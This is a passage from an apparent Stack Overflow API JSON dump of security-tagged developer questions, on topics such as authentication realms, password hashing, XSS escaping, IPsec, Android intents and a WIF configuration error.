rel=\"nofollow\">I found this one</a>)?</p>\n\n<p>I'm concerned Apple won't like me interacting with a users sensitive data directly like that.</p>\n"},{"tags":["security","glassfish","realm","asadmin"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12566509,"title":"How can i define a Loginmodule from Glassfish asadmin?","body":"<p>I'm currently implementing a Glassfish realm backed by a neo4j DB.</p>\n\n<p>For that, i've defined a Realm class and a LoginModule class.</p>\n\n<p>I can install the realm using the <a href=\"http://docs.oracle.com/cd/E18930_01/html/821-2433/create-auth-realm-1.html#scrolltoc\" rel=\"nofollow\"><code>create-auth-realm asadmin</code></a> command. But, for that realm to work, it must be associated to a LoginModule defined in <code>config/login.conf</code> file.</p>\n\n<p>In my own example, if I create my realm using </p>\n\n<pre><code>create-auth-realm --classname com.mycompany.security.MyRealm --property jaas-context=MyLoginModule myrealm\n</code></pre>\n\n<p>I must before that define <code>MyLoginModule</code> in that <code>config/login.conf</code> file :</p>\n\n<pre><code>MyLoginModule {\nfr.mycompany.security.MyLoginModule required;\n};\n</code></pre>\n\n<p>I can of course edit the file by hand. But, is there any asadmin subcommand or combo able to add the required elements to that file in a more DevOps like way ?</p>\n"},{"tags":["java","web-services","security","authentication","tomcat"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12566876,"title":"User authentication for web services in Java","body":"<p>Suppose I have a simple Java server application, which implements a few web (<code>REST</code>) services. The application is deployed as <code>war</code> in <code>Tomcat</code>. Now I would like to add user authentication as follows:</p>\n\n<ul>\n<li><p>Add a plain text file <code>users</code> with user names and passwords on the server side. User is required to send both user name and password with each request and the server tests them against the file.</p></li>\n<li><p>In order to prevent sending passwords as clear text I am considering one-way encryption just like one used in <code>/etc/passwd</code>. So users will be required to encrypt their passwords before sending them in the requests. </p></li>\n</ul>\n\n<p>Does this approach make any sense? Is there any \"ready-to-use\" implementation of this approach in Java?</p>\n"},{"tags":["security","authentication","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12566394,"title":"How can I encrypt a link in order to encrypt the file location and keep it hidden?","body":"<p>I don't have a clue of what I have to do in order to fix that and after searching this website it looks like I could get an answer here.</p>\n\n<p>I'm working on a website of a client. He's a marketer and he has digital products and he allows some of them to be downloaded for free.</p>\n\n<p>After they click the download, I send them an email with a link for the download.</p>\n\n<p>My question is: how can I encrypt this link so that the file location remains hidden? The files are usually in video, mp3, or pdf format.</p>\n"},{"tags":["c#","security","winapi","windows-8","internet-explorer-10"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12538367,"title":"Using CredEnumerate to pull WebCredentials","body":"<p>As part of a password management tool, I am attempting to enumerate IE 10 web site usernames (i.e., auto-complete usernames) by using <code>CredEnumerate</code>.  When I call <code>CredEnumerate</code>, it yields several usernames (generic usernames and domain usernames) from within the \"Windows Credentials\" section of the \"Credential Manager\", but does not include anything from the \"Web Credentials\" section of the Credential Manager (Control Panel\\User Accounts and Family Safety\\Credential Manager).</p>\n\n<pre><code>private static void Main()\n{\n    int count;\n    IntPtr pCredentials;\n    bool ret = CredEnumerate(null, 1, out count, out pCredentials);\n    // ...\n}\n</code></pre>\n\n<p>How can I get access to the Web Credentials?</p>\n"},{"tags":["security","passwords","password-protection","bcrypt","password-encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12094209,"title":"Is it insecure to describe my use of bcrypt to users?","body":"<p>Password security is a concern for many.</p>\n\n<p>I would like to include a \"Learn about our password security\" link that explains that we use bcrypt for password hashing and how it works.</p>\n\n<p>Does making this information public cause any security worries or make my system less secure?</p>\n"},{"tags":["php","security","ddos"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12564617,"title":"DDoS vulnerable forms","body":"<p>I recently heard that a website can be DDoS'ed through the those doing the attack submitting forms with i.e 2MB data (in characters), lot's of times very rapidly. Is this statement true? If so, is there anything I can do in PHP to prevent this, i.e set the form data limit down?</p>\n"},{"tags":["security","dynamic","static-analysis","webapp2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12565764,"title":"Web Application Security Scanner","body":"<p>I want to buy a Web application security scanner,keeping in mind the following:</p>\n\n<p>1) The price\n2) vulnerabilities found\n3) Reporting</p>\n\n<p>Kindly suggest me the best among,HP WebInspect,IBM Rational Appscan,Veracode,Cenzic,Whitehat Sentinel,&amp;,Qualsys.</p>\n\n<p>Your responses are highly appreciated.</p>\n"},{"tags":["javascript","security","jquery-mobile","iis6","ip-address"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12565152,"title":"Restricting access to IP of web server when request is from JavaScript","body":"<p>I have the following architecture for my app:</p>\n\n<p>jQueryMobile web app --> Gets JSON from ---> REST API created in C#</p>\n\n<p>I have placed the REST API Code in a virtual directory in IIS 6.\nThe Mobile site code is running in the root of the website... so the rough file structure is like this:</p>\n\n<pre>\n\ninetpub/\n\n    /index.html\n    myjavascript.js\n\n    /restapi/\n      web.config\n      Global.asax\n      bin/(bunch of Dlls...)\n\n</pre>\n\n<p>The Server is behind a network with the following sort of IP translation (not the real IPs...)\nFor example:</p>\n\n<pre>\nWeb Server external IP:  121.131.141.50  (with URL http://mysite.com/)\nInternal IP:             10.210.2.5\nSubnet:                  255.255.255.0\n</pre>\n\n<p>I have tried restricting access to the <code>restapi</code> folder by IP as I would like for it only to be accessible from the web server.  I have tried the IIS approach and set Directory Security settings, and have also tried the approach of using a <code>ServiceAuthorizationManager</code> class to check Request IP in the Http Request.<br>\nBoth approaches gave me the same result: There was no problem restricting and testing the actual service call through Fiddler to prove that a 401 would be thrown from any IP other than the web server IP: 10.210.2.5.  I was also able to execute it from the webserver (which is the desired setup).</p>\n\n<p>However, once the Mobile site javascript calls it, I get the 401 unauthorized. As the Javascript code is client side, the restapi assumes that the call is coming from the Client's IP address, which of course, is blocked.</p>\n\n<p>Is there a neat way to check that the call comes from the IP where JavaScript is sitting?  </p>\n\n<p>Or Is there a better way to go about the whole thing?! :-/  Is there a way to make the web app specifically permitted to access the <code>restapi</code> virtual directory ?</p>\n"},{"tags":["perl","security","ip","openvpn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12546285,"title":"OpenVPN failure, CGIIRC miracle or just a misunderstanding?","body":"<p>I'm getting on trouble while i'm trying to install a IRC secured by OpenVPN.</p>\n\n<p>let's take a look on my steps :<br>\nat this point my IP (the true one) is : 92.148.169.247<br>\n1) i create user account on my website<br>\n2) i generate OpenVPN certificate, download them and connect to the OVPN server.<br>\n  At this point my IP is become : 88.191.149.66 (seen with monip.org)<br>\n3) i connect to the CGIIRC (webIRC) interface (PERl written version)<br></p>\n\n<p>This CGIIRC is configured so it can only accept connection from the openVPN server IP (88.191.149.66).</p>\n\n<p>The point is :<br> when i try to connect to CGIIRC, it refuse my connection, and tell me that my \"true\" IP, 92.148.169.247 isn't allowed.<br>\nHow CGIIRC can see my true IP ? I thought that OPenVPN would hide my IP to only show his server IP adresse instead of mine.<br></p>\n"},{"tags":["android","security","android-intent"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12555399,"title":"How to restrict Android Intents or add security","body":"<p>I have added an intent filter to an activity in my application so that other apps can access certain data (from the cloud) via my app. However, some users may have privacy concerns and may not be too happy at their data being used. However, other apps can plug in to mine, to back up their settings etc to the cloud.</p>\n\n<p>Now, I need some kind of security mechanism to restrict which apps can access mine so that I can disallow malicious apps etc. While it is impossible to identify a malicious app, I would like some kind of access control by allowing only certain 'trusted' packagenames. However I cannot find how to do that.</p>\n\n<p>The other option is to add a permission requirement, but this can be overlooked by more users. While that would be the users fault (and it would be my fault if I do not add the permission), recently apps have taken a lot of flak for exposing user content.</p>\n\n<p>The third option is to prompt the user each time some app access mine. However I do not have the packagename so I cannot tell where the intent came from. Also, my app automates certain transfers from the cloud, so the user may 'set and forget' the intent.</p>\n\n<p>I am relying on just intents to transfer some commands between two different applications. I see that I will have to implement safeguards myself, but I do not want to re-invent the wheel if Google already has some flows in place. If not, I will have to implement my own authentication flow or something like that.</p>\n\n<p>EDIT: I'm a noob so I use terms too loosely. Tried to make the question better.</p>\n\n<p>A bit more about the app. It automates downloads/uploads from/to a cloud service. By sending an intent, another app can specify a file to be downloaded or uploaded. I dont want this to happen without the user knowing, so I would prompt him when the intent comes in and I accept the data. But also, the application can set up recurring transfers. While the user has now been prompted twice (once on permissions, and once when the intent comes in) he has no right to complain. But is this acceptable practice or do I need to safeguard it more somehow.</p>\n"},{"tags":["linux","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12561976,"title":"Linux Security - CentOS/RedHat","body":"<p>I just setting up the security on a CentOS/RedHat Server - (Amazon EC2 Linux AMI):</p>\n\n<p>I'm looking to install the following:\n- rkhunter version 1.4.0\n- chkrootkit\n- fail2ban\n- jailkit</p>\n\n<p>Any other intrusion detection installs I should add?</p>\n\n<p>thx</p>\n"},{"tags":["database","security","database-design","redis","sharding"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":146,"score":4,"question_id":12016376,"title":"How to secure Redis Cluster?","body":"<p>I know Redis Cluster is still unstable, but it's been passing all the unit tests since quite a long time so I started using it.</p>\n\n<p>I would like to know if a Redis Cluster would work well if the nodes required authentication. I'm incline to think yes, because they connect through a different port and use a different protocol, but I'm not sure and couldn't find any documentation or anything on the <a href=\"http://redis.io/topics/cluster-spec/\" rel=\"nofollow\">spec</a> to confirm this.</p>\n\n<p>Also, if the redis cluster protocol flies over the authentication barrier, isn't it a hole in security ? Could my database be accessed by the outside world ? (the port at least must be accessible so it can talk to the other nodes)</p>\n"}]}
{"total":17772,"page":13,"pagesize":100,"questions":[{"tags":["security","couchdb","couchapp"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":443,"score":4,"question_id":5448463,"title":"How to create a users database in a couchapp with per user database security model? (per document read access)","body":"<p>Hi I read about two ways for implementing per-document read access for couchapps:</p>\n\n<ol>\n<li>Each user gets his own database which contains only data this user is allowed to read. Then all users write to a master database that replicates to all user databases using a replication filter that decides who can read what.</li>\n<li>Using list functions to filter the output of other views and to restrict access via a proxy server and a whitelist.</li>\n</ol>\n\n<p>I have some questions about this:</p>\n\n<ol>\n<li><p>Are there more possibillities to acieve read access on document level?</p></li>\n<li><p>How do i create a users private database in a couchapp? i do need admin rights for that but a user who fills out the signUp form of my application clearly can't have admin rights. do i need a middle-layer (php etc...) for the signup process so that i can create the database needed?</p></li>\n<li><p>When i finally have this database i need to start continous replication using a filter. somewhere i read that such replications are not resumed when the server is rebooted. do i need a chronjob that recreates these replications ever x hours for the case that the server crashes??</p></li>\n<li><p>isn't that a huge waste of disk space? most of the data gets duplicated for every user that registers for my application or am i wrong? (especially if there is only little information that must not be read by others)</p></li>\n</ol>\n"},{"tags":["ios","security","browser","web-security","http-caching"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12257663,"title":"Risks associated with HTTPS caching","body":"<p>I read that HTTPS caching in browsers(especially on mobile platforms) needs to be avoided if possible. I'm curious about the risks associated with allowing HTTPS responses to be cached by browsers.</p>\n\n<p>Also, would be be a better idea to disallow caching on the server side or at the client side?</p>\n\n<p>[EDIT] I'm specifically concerned with iOS browsers -- however, I dont seem to be able to add another tag to specify the same. :)</p>\n"},{"tags":["security","centos","vpn","ipsec"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12559480,"title":"Using IPsec to ensure traffic between the peers is always encrypted","body":"<p>I have implemented a IPsec connection between two pairs using openswan (opens/wan) in CentOS 6. This is running fine and i can see the traffic is encrypted. However if for whatever reason the IPsec tunnel no longer exists (maybe someone turned it off, maybe it crashed, etc), traffic will still flow between the peers as unencrypted traffic.</p>\n\n<p>How can I ensure that traffic between these two peers is always sent encrypted with IPsec or no traffic between the peers is accepted.</p>\n\n<p>Iptables does not seem to help, as the packets go through the iptables rules twice once encrypted and once again unencrypted.</p>\n\n<p>Thanks in advance. </p>\n"},{"tags":["security","unicode","xss","cjk"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12558875,"title":"Is unicode-based XSS an issue?","body":"<p>Maybe this is better for security.stack, I'm not sure, but here's the question:</p>\n\n<p>I recently came across a blog claiming that <code></code> will get parsed into an actual <code>&lt;script&gt;</code>.  However, in my tests on recent Chrome, this is not the case.  Has anyone ever heard of a browser parsing it as real markup?  If so, then I have no idea how one would mitigate against it, since presumably there are others and not just <code>''</code> to worry about, and I know that I'm not up for going through all of unicode to enumerate them.</p>\n"},{"tags":["java","web-services","security","wso2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":745,"score":1,"question_id":1394616,"title":"Client to consume a WSO2 WSAS Web Service with Username Token Security","body":"<p>Dear all,\nI need to implement a client to consume a Web Service that is deployed on the WSO2 WSAS with username token security.</p>\n\n<p>I can use the stub generated by the wsdl2java, a dynamic approach is not necessary right now.</p>\n\n<p>There is any tutorial that can help me to accomplish this task? I have already searched but without success!</p>\n\n<p>Best regards,\nUkrania</p>\n"},{"tags":["osx","security","osx-lion","abaddressbook","osx-mountain-lion"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":11911719,"title":"How can I reset Contact access permission, so the os will ask again?","body":"<p>I know I can turn on and off permission in <code>System Preferences -&gt; Security &amp; Privacy -&gt; Privacy -&gt; Contacts</code>, but what I want to do is force the OS to ask for permission again. This is for testing purposes... I.e. I maybe have a bug that gets triggered when the permission request dialog is shown.</p>\n\n<p>Any ideas where the \"asked\" flag is being stored, so I can blow it away? I've checked in <code>~/Library/Application Support/AddressBook/</code> and a bunch of other obvious places.</p>\n"},{"tags":["spring","security","weblogic"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":226,"score":1,"question_id":12049643,"title":"weblogic security realm with spring security filters","body":"<p>I am using spring security 3.1.1  for authentication.Application is deployed in weblogic server with security realm enabled for accessing datasource. for servlets I can give \n    <code>&lt;run-as&gt;</code>\n    <code>&lt;role-name&gt;testrole&lt;/role-name&gt;</code>\n    <code>&lt;/run-as&gt;</code></p>\n\n<p>how do i do the same for spring security filters. I am getting this error while accessing datasource from filters</p>\n\n<h2>: User \"\" does not have permission to perform operation \"reserve\" on resource \"jdbc/DataSource\"</h2>\n\n<p>securityContext.xml</p>\n\n<pre><code>&lt;context:annotation-config/&gt;\n&lt;sec:http use-expressions=\"true\" entry-point-ref=\"loginUrlAuthenticationEntryPoint\" &gt;\n&lt;sec:intercept-url pattern=\"/**\" access=\"permitAll\"/&gt;\n&lt;sec:custom-filter position=\"LOGOUT_FILTER\" ref=\"LogoutFilter\" /&gt;\n&lt;sec:custom-filter position=\"BASIC_AUTH_FILTER\" ref=\"AuthenticationFilter\"/&gt;\n&lt;/sec:http&gt;\n&lt;bean id=\"LogoutFilter\" class=\"com.xxx.LogoutFilter\"&gt;\n&lt;constructor-arg&gt;\n&lt;bean class=\"com.xxx.LogoutSuccessHandler\"&gt;&lt;/bean&gt;\n&lt;/constructor-arg&gt;\n&lt;constructor-arg&gt;\n&lt;list&gt;\n&lt;bean class=\"com.xxx.LogoutHandler\"&gt;&lt;/bean&gt;\n&lt;/list&gt;\n&lt;/constructor-arg&gt;\n&lt;/bean&gt;\n\n&lt;bean id=\"AuthenticationFilter\" class=\"com.xxx.AuthenticationFilter\" &gt;\n&lt;constructor-arg type=\"java.lang.String\"&gt;\n&lt;value&gt;/login.do&lt;/value&gt;\n&lt;/constructor-arg&gt;\n&lt;property name=\"authenticationManager\" ref=\"authenticationManager\" /&gt;\n&lt;property name=\"authenticationSuccessHandler\" ref=\"successHandler\" /&gt;\n&lt;property name=\"authenticationFailureHandler\" ref=\"failureHandler\" /&gt;\n&lt;/bean&gt;\n\n&lt;bean id=\"loginUrlAuthenticationEntryPoint\"\nclass=\"org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint\"&gt;\n&lt;property name=\"loginFormUrl\" value=\"/common/dologin.jsp\" /&gt;\n&lt;/bean&gt;\n\n&lt;bean id=\"successHandler\" class=\"com.xxx.AuthSuccessHandler\"/&gt;\n&lt;bean id=\"failureHandler\" class=\"com.xxx.AuthFailureHandler\"/&gt;\n\n&lt;sec:authentication-manager alias=\"authenticationManager\"&gt;\n&lt;sec:authentication-provider ref=\"jaasAuthenticationProvider\" /&gt;\n&lt;/sec:authentication-manager&gt;\n\n\n&lt;bean id=\"jaasAuthenticationProvider\"\nclass=\"com.xxx.JaasAuthenticationProvider\"&gt;\n\n&lt;property name=\"callbackHandlers\"&gt;\n&lt;list&gt;\n&lt;bean class=\"com.xxx.security.callback.SecurityInfoProvider\"&gt;\n&lt;/bean&gt;\n&lt;/list&gt;\n&lt;/property&gt;\n&lt;property name=\"authorityGranters\"&gt;\n&lt;list&gt;\n&lt;bean class=\"com.xxx.security.action.RoleUserAuthorityGranter\" /&gt;\n&lt;/list&gt;\n&lt;/property&gt;\n&lt;/bean&gt;\n\n&lt;/beans&gt;\n</code></pre>\n"},{"tags":["iphone","security","visualization","mobile-phones"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":1146,"score":2,"question_id":2050718,"title":"Searching for a masters thesis topic","body":"<p>I am a student at an university and I have to write my master thesis (information technology / computer science). I have experience with programming (Objctive-C, PHP, web development, Java, C/C++, JSP, J2ME) and SQL databases like MySQL, PostgreSQL, Apache Derby.</p>\n\n<p>I am currently interested in two topics: visualization and/or security.</p>\n\n<p>Security: I have knowledge in crytography, network systems, firewalls, I did some basic implementations of RSA and AES. But I have no idea what is interesting in the future, I do not have the  needed overview of \"what's next\".</p>\n\n<p>Visualization: I found the project Sixth Sense of the MIT Media Lab (http://www.youtube.com/watch?v=eUy8j4TMH2M) which is a wearable device with a projector and a camera which recognize finger gestures and so you can \"control\" the user interface. I found this very interesting because in my opinion mobile devices will be more powerful (better processors, longer battery life, ...) in the future and it would be nice to have the screen instead of a display on every surface you want.</p>\n\n<p>Because I only have 6 months to do my thesis (2-3 months for developing something) and so I only can build up a prototype and I am searching for ideas. Perhaps it is possible to do an iPhone app?!</p>\n\n<p>Perhaps someone could give me some suggestions.</p>\n\n<p>Thanks a lot in advance &amp; Best Regards.</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":64,"score":2,"question_id":12555128,"title":"What is the difference between urlencode and rawurlencode?","body":"<p>I read the reference question <a href=\"http://stackoverflow.com/questions/996139/php-urlencode-vs-rawurlencode\">PHP - urlencode vs rawurlencode?</a> in the way, that I should use <code>rawurlencode</code></p>\n\n<p>e.g. </p>\n\n<blockquote>\n  <p>If interoperability with other systems is important then it seems rawurlencode is the way to go. </p>\n</blockquote>\n\n<p>But why was <code>urlencode</code> invented then? Does it mean this function is useless?</p>\n"},{"tags":["php","flash","security","encryption","actionscript"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12552887,"title":"Securing Flash to PHP communication","body":"<p>I have a flash game with a php backend and MySQL database.</p>\n\n<p>To play the game, users must login. During gameplay the client will also periodically send updates to the database. For example, when the user purchases a new in-game item.</p>\n\n<p>I have two concerns. Firstly the username and password are being sent in plain text to the server (it's encrypted in my database however). Secondly, after logging in, the client will be sent a user ID to be used in all subsequent requests. These requests are also being sent in plain text.</p>\n\n<p>Both of these communications are at risk from packet sniffing. Once someone gets an idea of the structure of the requests to the server, they could create their own bogus requests, substitute their own values/user IDs and generally cause a lot of upset.</p>\n\n<p>What are my options? would buying an SSL cert and using https be a solution? Could I use a public/private key type thing?</p>\n"},{"tags":["php","security","xss","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":59,"score":-2,"question_id":12554980,"title":"Is PHP htmlentities (with UTF-8 encoding specified) enough for protecting XSS","body":"<p>Assume the template code in PHP is</p>\n\n<pre><code>&lt;div&gt;\n  &lt;? echo htmlentities($unfiltered_text, ENT_QUOTES, \"UTF-8\");\n&lt;/div&gt;\n</code></pre>\n\n<p>Is the following code safe to against <code>ALL possible XSS</code>?</p>\n\n<p>is not, can you give an example? Thanks.</p>\n"},{"tags":["c#","security",".net-4.0","wif","windows-identity"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":135,"score":0,"question_id":12553712,"title":"CryptographicException: The data is invalid in MVC 4 with WIF enabled","body":"<p>I have created a MVC 4 Project and set it up for Azure ACS. It worked with System.Identity. I changed it to use the Microsoft.Identity for enabling WIF and my config file looks like this now: </p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!--\n  For more information on how to configure your ASP.NET application, please visit\n  http://go.microsoft.com/fwlink/?LinkId=169433\n  --&gt;\n&lt;configuration&gt;\n  &lt;configSections&gt;\n    &lt;!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 --&gt;\n    &lt;section name=\"entityFramework\" type=\"System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=4.4.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" requirePermission=\"false\" /&gt;\n    &lt;section name=\"microsoft.identityModel\"\n             type=\"Microsoft.IdentityModel.Configuration.MicrosoftIdentityModelSection, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" /&gt;\n  &lt;/configSections&gt;\n  &lt;connectionStrings&gt;\n\n    &lt;add name=\"DefaultConnection\"  /&gt;\n  &lt;/connectionStrings&gt;\n  &lt;appSettings&gt;\n    &lt;add key=\"webpages:Version\" value=\"2.0.0.0\" /&gt;\n    &lt;add key=\"webpages:Enabled\" value=\"false\" /&gt;\n    &lt;add key=\"PreserveLoginUrl\" value=\"true\" /&gt;\n    &lt;add key=\"ClientValidationEnabled\" value=\"true\" /&gt;\n    &lt;add key=\"UnobtrusiveJavaScriptEnabled\" value=\"true\" /&gt;\n    &lt;add key=\"ida:FederationMetadataLocation\" value=\"https://traffictheory.accesscontrol.windows.net/FederationMetadata/2007-06/FederationMetadata.xml\" /&gt;\n    &lt;add key=\"ida:ProviderSelection\" value=\"ACS\" /&gt;\n  &lt;/appSettings&gt;\n  &lt;location path=\"FederationMetadata\"&gt;\n    &lt;system.web&gt;\n      &lt;authorization&gt;\n        &lt;allow users=\"*\" /&gt;\n      &lt;/authorization&gt;\n    &lt;/system.web&gt;\n  &lt;/location&gt;\n  &lt;system.web&gt;\n    &lt;!--&lt;authorization&gt;\n      &lt;deny users=\"?\" /&gt;\n    &lt;/authorization&gt;--&gt;\n    &lt;authentication mode=\"None\" /&gt;\n    &lt;compilation debug=\"true\" targetFramework=\"4.0\" /&gt;\n    &lt;!--Commented out by Identity and Access VS Package--&gt;\n    &lt;!--&lt;authentication mode=\"Forms\"&gt;&lt;forms loginUrl=\"~/Account/Login\" timeout=\"2880\" /&gt;&lt;/authentication&gt;--&gt;\n    &lt;pages&gt;\n      &lt;namespaces&gt;\n        &lt;add namespace=\"System.Web.Helpers\" /&gt;\n        &lt;add namespace=\"System.Web.Mvc\" /&gt;\n        &lt;add namespace=\"System.Web.Mvc.Ajax\" /&gt;\n        &lt;add namespace=\"System.Web.Mvc.Html\" /&gt;\n        &lt;add namespace=\"System.Web.Optimization\" /&gt;\n        &lt;add namespace=\"System.Web.Routing\" /&gt;\n        &lt;add namespace=\"System.Web.WebPages\" /&gt;\n      &lt;/namespaces&gt;\n    &lt;/pages&gt;\n    &lt;httpRuntime requestValidationMode=\"4.5\" /&gt;\n  &lt;/system.web&gt;\n  &lt;system.webServer&gt;\n    &lt;validation validateIntegratedModeConfiguration=\"false\" /&gt;\n    &lt;modules runAllManagedModulesForAllRequests=\"true\"&gt;\n        &lt;add name=\"WSFederationAuthenticationModule\"\n       type=\"Microsoft.IdentityModel.Web.WSFederationAuthenticationModule, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" /&gt;\n      &lt;add name=\"SessionAuthenticationModule\"\n           type=\"Microsoft.IdentityModel.Web.SessionAuthenticationModule, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" /&gt;\n      &lt;add name=\"ClaimsAuthorizationModule\"\n           type=\"Microsoft.IdentityModel.Web.ClaimsAuthorizationModule, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" /&gt;\n\n    &lt;/modules&gt;\n    &lt;handlers&gt;\n      &lt;remove name=\"ExtensionlessUrlHandler-ISAPI-4.0_32bit\" /&gt;\n      &lt;remove name=\"ExtensionlessUrlHandler-ISAPI-4.0_64bit\" /&gt;\n      &lt;remove name=\"ExtensionlessUrlHandler-Integrated-4.0\" /&gt;\n      &lt;add name=\"ExtensionlessUrlHandler-ISAPI-4.0_32bit\" path=\"*.\" verb=\"GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_isapi.dll\" preCondition=\"classicMode,runtimeVersionv4.0,bitness32\" responseBufferLimit=\"0\" /&gt;\n      &lt;add name=\"ExtensionlessUrlHandler-ISAPI-4.0_64bit\" path=\"*.\" verb=\"GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_isapi.dll\" preCondition=\"classicMode,runtimeVersionv4.0,bitness64\" responseBufferLimit=\"0\" /&gt;\n      &lt;add name=\"ExtensionlessUrlHandler-Integrated-4.0\" path=\"*.\" verb=\"GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS\" type=\"System.Web.Handlers.TransferRequestHandler\" preCondition=\"integratedMode,runtimeVersionv4.0\" /&gt;\n    &lt;/handlers&gt;\n  &lt;/system.webServer&gt;\n  &lt;runtime&gt;\n    &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;\n      &lt;dependentAssembly&gt;\n        &lt;assemblyIdentity name=\"System.Web.Helpers\" publicKeyToken=\"31bf3856ad364e35\" /&gt;\n        &lt;bindingRedirect oldVersion=\"1.0.0.0-2.0.0.0\" newVersion=\"2.0.0.0\" /&gt;\n      &lt;/dependentAssembly&gt;\n      &lt;dependentAssembly&gt;\n        &lt;assemblyIdentity name=\"System.Web.Mvc\" publicKeyToken=\"31bf3856ad364e35\" /&gt;\n        &lt;bindingRedirect oldVersion=\"0.0.0.0-4.0.0.0\" newVersion=\"4.0.0.0\" /&gt;\n      &lt;/dependentAssembly&gt;\n      &lt;dependentAssembly&gt;\n        &lt;assemblyIdentity name=\"System.Web.WebPages\" publicKeyToken=\"31bf3856ad364e35\" /&gt;\n        &lt;bindingRedirect oldVersion=\"1.0.0.0-2.0.0.0\" newVersion=\"2.0.0.0\" /&gt;\n      &lt;/dependentAssembly&gt;\n    &lt;/assemblyBinding&gt;\n  &lt;/runtime&gt;\n  &lt;entityFramework&gt;\n    &lt;defaultConnectionFactory type=\"System.Data.Entity.Infrastructure.SqlConnectionFactory, EntityFramework\" /&gt;\n  &lt;/entityFramework&gt;\n  &lt;microsoft.identityModel&gt;\n    &lt;service&gt;\n      &lt;audienceUris&gt;\n        &lt;add value=\"http://localhost:48451/\" /&gt;\n      &lt;/audienceUris&gt;\n\n    &lt;issuerNameRegistry type=\"Microsoft.IdentityModel.Tokens.ConfigurationBasedIssuerNameRegistry, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\"&gt;\n      &lt;trustedIssuers&gt;\n        &lt;add thumbprint=\"033F53598E4ED92E51C07238E36BBFF4E67ABAD2\" name=\"https://traffictheory.accesscontrol.windows.net/\" /&gt;\n      &lt;/trustedIssuers&gt;\n    &lt;/issuerNameRegistry&gt;\n\n    &lt;federatedAuthentication&gt;\n      &lt;cookieHandler requireSsl=\"false\" /&gt;\n      &lt;wsFederation passiveRedirectEnabled=\"true\"\n                    issuer=\"https://traffictheory.accesscontrol.windows.net/v2/wsfederation\"\n                    realm=\"http://localhost:48451/\" reply=\"http://localhost:48451/\"\n                    requireHttps=\"false\" /&gt;\n    &lt;/federatedAuthentication&gt;\n      &lt;certificateValidation certificateValidationMode=\"None\" /&gt;\n      &lt;/service&gt;\n  &lt;/microsoft.identityModel&gt;\n\n&lt;/configuration&gt;\n</code></pre>\n\n<p>My problem is when i run the site i get:</p>\n\n<pre><code>[CryptographicException: The data is invalid.\n]\n   System.Security.Cryptography.ProtectedData.Unprotect(Byte[] encryptedData, Byte[] optionalEntropy, DataProtectionScope scope) +318\n   Microsoft.IdentityModel.Web.ProtectedDataCookieTransform.Decode(Byte[] encoded) +203\n\n[InvalidOperationException: ID1073: A CryptographicException occurred when attempting to decrypt the cookie using the ProtectedData API (see inner exception for details). If you are using IIS 7.5, this could be due to the loadUserProfile setting on the Application Pool being set to false. ]\n   Microsoft.IdentityModel.Web.ProtectedDataCookieTransform.Decode(Byte[] encoded) 